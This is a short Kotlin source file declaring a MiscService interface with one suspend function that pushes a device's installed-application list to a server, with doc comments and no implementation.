package com.hawkshaw.library.datalayer.network.service

import com.hawkshaw.library.datalayer.models.PushInstalledAppListRequest
import com.hawkshaw.library.datalayer.models.PushInstalledAppListResponse
import com.hawkshaw.library.datalayer.network.twirp.ApiResponse

/**
 * Service for handling miscellaneous operations
 */
interface MiscService {
    /**
     * Push installed application list to the server
     * 
     * @param request The installed application data to push
     * @return The response from the server
     */
    suspend fun pushInstalledAppList(request: PushInstalledAppListRequest): ApiResponse<PushInstalledAppListResponse>
} 